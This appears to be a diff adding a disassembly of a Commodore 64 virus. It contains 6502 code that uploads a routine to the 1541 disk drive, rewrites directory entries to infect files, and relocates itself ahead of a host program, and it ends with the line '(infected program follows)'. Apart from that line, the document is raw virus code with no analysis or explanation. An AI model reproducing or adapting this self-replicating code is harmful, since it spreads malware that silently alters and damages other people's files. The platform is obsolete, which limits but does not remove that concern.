@@ -1,0 +1,257 @@
+; basic stub
+0800 .byte $00,$0b,$08,$c8,$07,$9e,$32,$30,$35,$39,$00
+
+start
+.C:080b   2C 00 DD   BIT $DD00
+.C:080e   10 49      BPL $0859
+.C:0810   A9 0F      LDA #$0F
+.C:0812   85 FF      STA $FF
+.C:0814   A0 00      LDY #$00
+.C:0816   8C A0 08   STY $08A0
+.C:0819   20 A4 08   JSR $08A4
+.C:081c   A2 05      LDX #$05
+.C:081e   BD 9E 08   LDA $089E,X
+.C:0821   20 DD ED   JSR $EDDD
+.C:0824   CA         DEX
+.C:0825   10 F7      BPL $081E
+.C:0827   A2 20      LDX #$20
+.C:0829   B9 FD 07   LDA $07FD,Y
+.C:082c   20 DD ED   JSR $EDDD
+.C:082f   C8         INY
+.C:0830   D0 0D      BNE $083F
+
+.C:0832   EE 2B 08   INC $082B
+.C:0835   EE 9F 08   INC $089F
+.C:0838   C8         INY
+.C:0839   C8         INY
+.C:083a   A9 FB      LDA #$FB
+.C:083c   8D 2A 08   STA $082A
+.C:083f   CA         DEX
+.C:0840   D0 E7      BNE $0829
+
+.C:0842   20 AE FF   JSR $FFAE
+.C:0845   C6 FF      DEC $FF
+.C:0847   D0 CD      BNE $0816
+.C:0849   20 A4 08   JSR $08A4
+.C:084c   A9 55      LDA #$55
+.C:084e   20 DD ED   JSR $EDDD
+.C:0851   A9 34      LDA #$34
+.C:0853   20 DD ED   JSR $EDDD
+.C:0856   20 AE FF   JSR $FFAE
+.C:0859   A0 36      LDY #$36
+
+.C:085b   B9 67 08   LDA $0867,Y
+.C:085e   99 FC 00   STA $00FC,Y
+.C:0861   88         DEY
+.C:0862   10 F7      BPL $085B
+.C:0864   4C 00 01   JMP $0100
+
+.C:0867   04 07      NOOP $07
+.C:0869   00         BRK
+.C:086a   09 
+	  
+.C:086b   A9 36      LDA #$36
+.C:086d   85 01      STA $01
+.C:086f   A6 AF      LDX $AF
+.C:0871   A0 FD      LDY #$FD
+.C:0873   B1 FE      LDA ($FE),Y
+.C:0875   91 FC      STA ($FC),Y
+.C:0877   C8         INY
+.C:0878   D0 04      BNE $087E
+.C:087a   E6 FD      INC $FD
+.C:087c   E6 FF      INC $FF
+.C:087e   C4 AE      CPY $AE
+.C:0880   D0 F1      BNE $0873
+.C:0882   E4 FF      CPX $FF
+.C:0884   D0 ED      BNE $0873
+.C:0886   98         TYA
+.C:0887   38         SEC
+.C:0888   E9 FC      SBC #$FC
+.C:088a   85 AE      STA $AE
+.C:088c   85 2D      STA $2D
+.C:088e   A5 FF      LDA $FF
+.C:0890   E9 01      SBC #$01
+.C:0892   85 AF      STA $AF
+.C:0894   85 2E      STA $2E
+.C:0896   E6 01      INC $01
+.C:0898   20 59 A6   JSR $A659
+.C:089b   4C AE A7   JMP $A7AE
+
+.C:089e   20 04 A0   JSR $A004
+.C:08a1   57 2D      SRE $2D,X
+.C:08a3   4D A9 08   EOR $08A9
+.C:08a6   20 0C ED   JSR $ED0C
+.C:08a9   A9 6F      LDA #$6F
+.C:08ab   4C B9 ED   JMP $EDB9
+.C:08ae   A9 90      LDA #$90
+.C:08b0   2C A9 80   BIT $80A9
+.C:08b3   A2 03      LDX #$03
+.C:08b5   95 00      STA $00,X
+.C:08b7   B5 00      LDA $00,X
+.C:08b9   30 FC      BMI $08B7
+.C:08bb   C9 01      CMP #$01
+.C:08bd   F0 02      BEQ $08C1
+.C:08bf   68         PLA
+.C:08c0   68         PLA
+.C:08c1   60         RTS
+
+.C:08c2   A0 02      LDY #$02
+.C:08c4   A9 00      LDA #$00
+.C:08c6   91 C0      STA ($C0),Y
+.C:08c8   A0 04      LDY #$04
+.C:08ca   B1 C0      LDA ($C0),Y
+.C:08cc   A2 03      LDX #$03
+.C:08ce   DD C6 05   CMP $05C6,X
+.C:08d1   F0 05      BEQ $08D8
+.C:08d3   CA         DEX
+.C:08d4   10 F8      BPL $08CE
+.C:08d6   30 09      BMI $08E1
+.C:08d8   BD F6 04   LDA $04F6,X
+.C:08db   49 FF      EOR #$FF
+.C:08dd   25 C3      AND $C3
+.C:08df   85 C3      STA $C3
+.C:08e1   4C 4F 05   JMP $054F
+
+.C:08e4   A9 00      LDA #$00
+.C:08e6   85 0D      STA $0D
+.C:08e8   20 B4 04   JSR $04B4
+.C:08eb   A5 C3      LDA $C3
+.C:08ed   8D A7 06   STA $06A7
+.C:08f0   4C B1 04   JMP $04B1
+.C:08f3   08         PHP
+.C:08f4   04 02      NOOP $02
+.C:08f6   01 0F      ORA ($0F,X)
+.C:08f8   4C C5 04   JMP $04C5
+
+.C:08fb   00         BRK
+.C:08fc   00         BRK
+.C:08fd   00         BRK
+
+.C:08fe   A0 02      LDY #$02
+.C:0900   8C 00 18   STY $1800
+.C:0903   A9 08      LDA #$08
+.C:0905   8D 03 04   STA $0403
+.C:0908   88         DEY
+.C:0909   84 C2      STY $C2
+.C:090b   8C 02 04   STY $0402
+.C:090e   88         DEY
+.C:090f   84 0D      STY $0D
+.C:0911   84 C0      STY $C0
+.C:0913   A9 12      LDA #$12
+.C:0915   8D 00 04   STA $0400
+.C:0918   85 08      STA $08
+.C:091a   85 0A      STA $0A
+.C:091c   85 0C      STA $0C
+.C:091e   A9 06      LDA #$06
+.C:0920   85 C1      STA $C1
+.C:0922   A9 04      LDA #$04
+.C:0924   2C 00 18   BIT $1800
+.C:0927   10 FB      BPL $0924
+.C:0929   D0 F9      BNE $0924
+.C:092b   20 18 C1   JSR $C118
+.C:092e   A9 B0      LDA #$B0
+.C:0930   20 B6 04   JSR $04B6
+.C:0933   20 B4 04   JSR $04B4
+.C:0936   AD A7 06   LDA $06A7
+.C:0939   85 C3      STA $C3
+.C:093b   E6 0D      INC $0D
+.C:093d   20 B4 04   JSR $04B4
+.C:0940   A0 02      LDY #$02
+.C:0942   B1 C0      LDA ($C0),Y
+.C:0944   29 8F      AND #$8F
+.C:0946   C9 82      CMP #$82
+.C:0948   F0 15      BEQ $095F
+.C:094a   A5 C0      LDA $C0
+.C:094c   18         CLC
+.C:094d   69 20      ADC #$20
+.C:094f   85 C0      STA $C0
+.C:0951   90 ED      BCC $0940
+.C:0953   20 B1 04   JSR $04B1
+.C:0956   AD 01 06   LDA $0601
+.C:0959   85 0D      STA $0D
+.C:095b   10 E0      BPL $093D
+.C:095d   F0 83      BEQ $08E2
+.C:095f   C8         INY
+.C:0960   B1 C0      LDA ($C0),Y
+.C:0962   8D 00 05   STA $0500
+.C:0965   C9 12      CMP #$12
+.C:0967   D0 0D      BNE $0976
+.C:0969   A0 18      LDY #$18
+.C:096b   B1 C0      LDA ($C0),Y
+.C:096d   F0 87      BEQ $08F6
+.C:096f   38         SEC
+.C:0970   E9 01      SBC #$01
+.C:0972   91 C0      STA ($C0),Y
+.C:0974   B0 D4      BCS $094A
+.C:0976   C8         INY
+.C:0977   B1 C0      LDA ($C0),Y
+.C:0979   8D 01 05   STA $0501
+.C:097c   A2 03      LDX #$03
+.C:097e   A5 C3      LDA $C3
+.C:0980   3D F6 04   AND $04F6,X
+.C:0983   F0 05      BEQ $098A
+.C:0985   CA         DEX
+.C:0986   10 F6      BPL $097E
+.C:0988   30 C0      BMI $094A
+.C:098a   A5 C3      LDA $C3
+.C:098c   1D F6 04   ORA $04F6,X
+.C:098f   85 C3      STA $C3
+.C:0991   BD C6 05   LDA $05C6,X
+.C:0994   91 C0      STA ($C0),Y
+.C:0996   85 09      STA $09
+.C:0998   88         DEY
+.C:0999   A9 12      LDA #$12
+.C:099b   91 C0      STA ($C0),Y
+.C:099d   BD CA 05   LDA $05CA,X
+.C:09a0   8D 01 04   STA $0401
+.C:09a3   85 0B      STA $0B
+.C:09a5   A0 18      LDY #$18
+.C:09a7   A9 04      LDA #$04
+.C:09a9   91 C0      STA ($C0),Y
+.C:09ab   A2 01      LDX #$01
+.C:09ad   A9 90      LDA #$90
+.C:09af   20 B8 04   JSR $04B8
+.C:09b2   E8         INX
+.C:09b3   A9 90      LDA #$90
+.C:09b5   20 B8 04   JSR $04B8
+.C:09b8   C6 C2      DEC $C2
+.C:09ba   D0 8E      BNE $094A
+.C:09bc   20 B1 04   JSR $04B1
+.C:09bf   F0 9C      BEQ $095D
+
+.C:09c1   11 06      ORA ($06),Y
+.C:09c3   0C 12 0E   NOOP $0E12
+.C:09c6   03 09      SLO ($09,X)
+.C:09c8   0F 1D 1E   SLO $1E1D
+.C:09cb   1D 18 15   ORA $1518,X
+.C:09ce   13 12      SLO ($12),Y
+.C:09d0   00         BRK
+.C:09d1   00         BRK
+.C:09d2   00         BRK
+.C:09d3   00         BRK
+.C:09d4   00         BRK
+.C:09d5   00         BRK
+.C:09d6   00         BRK
+.C:09d7   00         BRK
+.C:09d8   00         BRK
+.C:09d9   00         BRK
+.C:09da   00         BRK
+.C:09db   00         BRK
+.C:09dc   00         BRK
+.C:09dd   1E 19 0E   ASL $0E19,X
+.C:09e0   19 0A 09   ORA $090A,Y
+.C:09e3   0A         ASL A
+.C:09e4   15 0E      ORA $0E,X
+.C:09e6   0F 0A 0F   SLO $0F0A
+.C:09e9   0D 0A 15   ORA $150A
+.C:09ec   19 13 16   ORA $1613,Y
+.C:09ef   0F 0A 0A   SLO $0A0A
+.C:09f2   13 0E      SLO ($0E),Y
+.C:09f4   1A         NOOP
+.C:09f5   0A         ASL A
+.C:09f6   1A         NOOP
+.C:09f7   09 0A      ORA #$0A
+.C:09f9   0E 1A 2C   ASL $2C1A
+.C:09fc   0B 
+
+(infected program follows)
